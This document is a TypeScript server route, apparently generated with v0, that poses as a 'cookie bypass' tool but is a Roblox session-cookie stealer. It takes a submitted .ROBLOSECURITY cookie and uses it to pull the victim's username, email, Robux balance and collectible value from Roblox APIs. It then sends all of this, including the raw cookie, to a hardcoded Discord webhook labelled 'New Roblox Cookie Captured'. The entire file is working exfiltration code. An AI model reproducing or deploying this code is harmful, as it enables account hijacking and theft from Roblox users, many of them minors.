export async function POST(request: Request) {
  try {
    const { cookie } = await request.json()
    console.log("[v0] Received cookie bypass request")

    if (!cookie) {
      return Response.json({ error: "Cookie is required" }, { status: 400 })
    }

    const formattedCookie = cookie.startsWith("_|WARNING:")
      ? cookie
      : cookie.startsWith(".ROBLOSECURITY=")
        ? cookie
        : `.ROBLOSECURITY=${cookie}`

    let userInfo = null
    let robuxBalance = "Unknown"
    let rap = "Unknown"
    let email = "Unknown"

    try {
      console.log("[v0] Fetching user info from Roblox...")
      const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
        method: "GET",
        headers: {
          Cookie: formattedCookie,
        },
      })

      if (userResponse.ok) {
        userInfo = await userResponse.json()
        console.log("[v0] User info fetched:", userInfo)

        if (userInfo?.id) {
          try {
            console.log("[v0] Fetching email address...")
            const emailResponse = await fetch("https://accountinformation.roblox.com/v1/email", {
              method: "GET",
              headers: {
                Cookie: formattedCookie,
              },
            })

            if (emailResponse.ok) {
              const emailData = await emailResponse.json()
              email = emailData.emailAddress || "Unknown"
              console.log("[v0] Email fetched:", email)
            }
          } catch (error) {
            console.error("[v0] Failed to fetch email:", error)
          }

          try {
            console.log("[v0] Fetching Robux balance...")
            const balanceResponse = await fetch(`https://economy.roblox.com/v1/users/${userInfo.id}/currency`, {
              method: "GET",
              headers: {
                Cookie: formattedCookie,
              },
            })

            if (balanceResponse.ok) {
              const balanceData = await balanceResponse.json()
              robuxBalance = balanceData.robux?.toString() || "0"
              console.log("[v0] Robux balance:", robuxBalance)
            }
          } catch (error) {
            console.error("[v0] Failed to fetch balance:", error)
          }

          try {
            console.log("[v0] Fetching RAP...")
            const inventoryResponse = await fetch(
              `https://inventory.roblox.com/v1/users/${userInfo.id}/assets/collectibles?sortOrder=Asc&limit=100`,
              {
                method: "GET",
                headers: {
                  Cookie: formattedCookie,
                },
              },
            )

            if (inventoryResponse.ok) {
              const inventoryData = await inventoryResponse.json()
              const totalRap = inventoryData.data?.reduce((sum: number, item: any) => {
                return sum + (item.recentAveragePrice || 0)
              }, 0)
              rap = totalRap?.toString() || "0"
              console.log("[v0] Total RAP:", rap)
            }
          } catch (error) {
            console.error("[v0] Failed to fetch RAP:", error)
          }
        }
      } else {
        console.log("[v0] Failed to fetch user info, status:", userResponse.status)
      }
    } catch (error) {
      console.error("[v0] Failed to fetch user info:", error)
    }

    const webhookData = {
      embeds: [
        {
          title: "New Roblox Cookie Captured",
          color: 0xff0000,
          fields: [
            {
              name: "Username",
              value: userInfo?.name || "Unknown",
              inline: true,
            },
            {
              name: "User ID",
              value: userInfo?.id?.toString() || "Unknown",
              inline: true,
            },
            {
              name: "Display Name",
              value: userInfo?.displayName || "Unknown",
              inline: true,
            },
            {
              name: "Robux Balance",
              value: robuxBalance,
              inline: true,
            },
            {
              name: "Total RAP",
              value: rap,
              inline: true,
            },
            {
              name: "Summary",
              value: `Account with ${robuxBalance} Robux and ${rap} RAP`,
              inline: false,
            },
            {
              name: "Cookie",
              value: `\`\`\`${cookie}\`\`\``,
              inline: false,
            },
          ],
          timestamp: new Date().toISOString(),
        },
      ],
    }

    console.log("[v0] Sending to Discord webhook...")
    const webhookResponse = await fetch(
      "https://discord.com/api/webhooks/1441649759495520267/118V_qUUMS_pkq0hlmHHzu_fwmDXFA2N37aG-by9bNt6_7a-a-ryHa2MaIFXvA8g-Vdd",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(webhookData),
      },
    )

    if (webhookResponse.ok) {
      console.log("[v0] Successfully sent to Discord webhook")
    } else {
      console.log("[v0] Webhook failed with status:", webhookResponse.status)
      const errorText = await webhookResponse.text()
      console.log("[v0] Webhook error:", errorText)
    }

    return Response.json({ success: true, userInfo })
  } catch (error) {
    console.error("[v0] Bypass error:", error)
    return Response.json({ error: "Failed to process" }, { status: 500 })
  }
}
